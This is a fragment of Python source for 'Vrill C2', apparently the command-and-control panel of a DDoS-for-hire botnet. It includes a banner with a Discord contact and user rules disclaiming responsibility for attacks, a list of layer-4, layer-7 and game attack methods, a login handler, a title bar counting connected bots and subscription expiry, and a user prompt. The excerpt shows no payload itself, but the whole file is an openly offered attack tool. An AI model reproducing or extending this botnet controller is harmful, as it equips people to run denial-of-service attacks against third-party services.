   ...
   \     /__)|  .  '.',|  |_.'(|  '---.'(|  '---.' 
    \   /    |  |\  \(_|  |    |      |  |      |  
     `-'     `--' '--' `--'    `------'  `------'  
            ...
            ( Discord: 0bxb_)
        Thank you for using Vrill C2
                Rules: 
        1. DO NOT ATTACK GOVERNMENT SITES.
        2. DO NOT SPAM ATTACKS.
        3. VRILL C2 WILL NOT BE RESPONSIBLE FOR ANY ACTIONS CAUSED BY YOU.
        4. ANY RULE BREAKING WILL RESULT IN A BAN AND IMMEDIATE BLACKLIST.
'''
...
# LOL...
botnetMethods = f"""{Methods_L4}{Methods_L7}{GameMethods}"""
...
def handle_client(client, address):
    send(client, "\33]0;Vrill C2 | Login\a")
    send(client, f'\x1bVrill C2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;Vrill C2 | Warriors online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}Vrill{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
